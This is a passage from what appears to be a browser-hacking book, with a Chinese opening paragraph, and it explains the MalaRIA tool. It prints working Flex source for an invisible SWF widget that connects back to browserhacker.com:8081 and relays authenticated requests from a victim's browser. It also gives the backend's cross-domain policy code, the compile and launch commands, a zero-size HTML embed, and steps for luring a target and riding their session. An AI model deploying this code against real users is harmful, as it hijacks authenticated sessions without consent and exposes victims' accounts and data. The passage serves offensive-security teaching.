
MalaRIA 由两个组件组成：Flash 或 Silverlight 客户端小部件以及代理后端。这两个客户端小部件的工作方式相同，但这里只讨论 Flash 小部件。下面的代码是 malariaproxy.mxml 的 SWF Flex 源码片段。浏览器加载 SWF 文件后，它会立即连接到代理后端，等待指令：

<x0.2367><y0.2469>```java
<mx:Application xmlns:mx="http://www.adobe.com/2006/mxml" 
layout="absolute" xmlns="*" 
creationComplete="useHttpService()">
<mx:Script>
<![CDATA[
[...]

/* Connect back to the proxy backend*/
public function useHttpService():void {
    socket = new Socket();
    ExternalInterface.call("log", "Connecting back to malaRIA");
    socket.addEventListener(Event.CONNECT, this.connectHandler);
    socket.addEventListener(ProgressEvent.SOCKET_DATA, this.onData);
    socket.connect("browserhacker.com", 8081);
}
/*handle data coming from the proxy backend*/
private function onData(event:ProgressEvent):void
{
    ExternalInterface.call("log", "Got data from proxy");
    var data:String = socket.readUTFBytes(socket.bytesAvailable);
    handle(data);
}

public function handle(data:String):void {
  var regresult:Object = /([^ ]+) ([^ ]+) ([^ ]+)( (.*))?/.exec(data);
  var verb:String = regresult[1];
  var url:String = regresult[2];
  var accept:String = regresult[3];
  var reqData:String = regresult[5];
  ExternalInterface.call("log", "Trying: [" + verb + " " + url + " "  
+ accept + " " + (verb == "POST" ? " " + reqData : "") + "]");

  /* issue the request to the target, as requested by the proxy*/
  var urlRequest:URLRequest = new URLRequest(url);
  urlRequest.method = (verb == "POST") ? URLRequestMethod.POST :
   URLRequestMethod.GET;
  if (reqData != null && reqData != "") {
    urlRequest.data = new URLVariables(reqData);
  }

 var loader:URLLoader = new URLLoader();
 loader.dataFormat = URLLoaderDataFormat.BINARY;

 /* send back the response to the proxy*/
 loader.addEventListener(Event.COMPLETE, onComplete);
 loader.addEventListener(IOErrorEvent.IO_ERROR, onIOError);
 loader.load(urlRequest);
 ExternalInterface.call("log", "Sent");
}

public function onComplete(event:Event):void {
 socket.writeUTFBytes(event.target.bytesTotal + ":");
 socket.writeBytes(event.target.data);
 socket.flush();
 ExternalInterface.call("log", "Sending back data - length " +  
event.target.bytesTotal + " (" + event.target.data.length + ")");
} 
[...]
    </mx:Script>
</mx:Application>
```

You can start the proxy back end with the following command:

<x0.2367><y0.2469>```java
sudo java malaria.MalariaServer browserhacker.com 8081
```

This command binds the malaRIA back end on port 8080. You want to point your browser to this port to allow all the traffic to be relayed through the SWF widget injected in the target’s hooked browser. Port 8081 is used by the malaRIA back end to handle reverse connections coming from the widget. You need root privileges to start the server because the application binds two additional sockets on ports 843 and 943. This is demonstrated in [Figure 9-31](#c09.html#figure9-31).

 start figure 

[**Figure 9-31:**](#c09.html#figureanchor9-31) malaRIA proxy ready to receive connections from the SWF widget

![c09f031.tif](image_fi/662090c09/c09f031.png)

 end figure 

These two ports are required because when the SWF or Silverlight widget connects back to the malaRIA server, it first needs to retrieve the cross-origin policy for browserhacker.com. If the widget is SWF, it tries to retrieve the policy from port 843. However, if it’s Silverlight it points to port 943. This is why the FlexPolicyServer.java class, part of the proxy back-end code, has the following method that returns the right cross-origin policy:

<x0.2367><y0.2469>```java
public static void printFlexPolicy(PrintStream clientOut, \
String hostname, int port) {
 clientOut.print("<?xml version=\"1.0\"?>\n");
 clientOut.print("<!DOCTYPE cross-domain-policy SYSTEM  \
\"/xml/dtds/cross-domain-policy.dtd\">");
 clientOut.print("<cross-domain-policy>");
 clientOut.print("<site-control permitted-cross-domain- \
policies=\"master-only\"/>");
 clientOut.print("<allow-access-from domain=\"" +  
 hostname + "\" to-ports=\"" + port + "\" />");
 clientOut.print("</cross-domain-policy>");
}
```

To generate the Flash SWF file from the Flex source, you need to use Adobe’s Flex SDK. You can compile the source code with the following command:

<x0.2367><y0.2469>```java
mxmlc --strict=true --file-specs malariaproxy.mxml
```

The next step is to embed the SWF file previously generated in an HTML file like the following:

<x0.2367><y0.2469>```java
<head>
<script>
function log(msg) {
 var elm = document.getElementById("log");
 elm.innerHTML += msg + "<br />";
}
</script>
</head>
<body>
<div id="log">
</div>
<object width="0" height="0">
<param name="movie" value="malariaproxy.swf">
<embed src="malariaproxy.swf" width="0" height="0"></embed>
</object>
```

To better understand what’s happening under the hood, the code contains an additional logging facility, the log() function. Integrating this with BeEF, you may want to inject the SWF in an already hooked page, removing the logging facility that uses ExternalInterface.call to send messages from the SWF to the DOM.

In the following example, the target is logged in to browservictim.com/dvwa/instructions.php. The domain exposes the /crossdomain.xml resource, which is an open cross-origin policy that allows connections from any domain.

You trick the target into opening http://browserhacker.com/malariaproxy.html, which embeds the malicious malaRIA SWF file. At the same time, you open another browser (Opera) that is configured to use the malaRIA HTTP proxy back end. Now you can simply request an authenticated page such as http://browservictim.com/dvwa/vulnerabilities/upload.

As a result, the proxy back end sends the request details to the SWF, as shown in [Figure 9-32](#c09.html#figure9-32). The SWF returns the related response to the proxy back end, which then returns the response to your browser. This behavior is similar to BeEF’s Tunneling Proxy. The main difference is that instead of using JavaScript to send the requests, an SWF file is used.

 start figure 

[**Figure 9-32:**](#c09.html#figureanchor9-32) malaRIA logs from both the proxy back end and the SWF file.

![c09f032.eps](image_fi/662090c09/c09f032.png)

 end figure 

Because the target is authenticated to [browservictim.com](http://browservictim.com), the SWF can issue authenticated requests to that same domain. As demonstrated in [Figure 9-33](#c09.html#figure9-33), the requested authenticated resource is correctly retrieved, without any knowledge about cookies or credentials.

 start figure 

[**Figure 9-33:**](#c09.html#figureanchor9-33) Attacker’s browser configured to use malaRIA proxy

![c09f033.tif](image_fi/662090c09/c09f033.png)

 end figure 

At this stage, you are effectively riding the target’s session. This example is using Flash, but you can obtain the same results with a malicious Silverlight widget.

The powerful thing about exploiting a liberal cross-origin policy is that after you inject your widget into the target’s browser, you can use it to connect to every origin on the Internet with this misconfiguration. If the target happens to be authenticated to multiple different origins, and all of them expose a liberal cross-origin policy, the impact of the attack will be much greater. Your malicious widget can now issue requests to all these origins and proxy the responses.

# Launching Denial-of-Service Attacks

When considering Denial-of-Service (DoS) attacks, most people think of a computer botnet issuing stupendous amounts of requests. As you know, the browser issues requests too and they can be sent cross-origin with minimal instruction. In this section, you’ll explore the consequences of employing this functionality in DoS attacks.

## Web Application Pinch Points

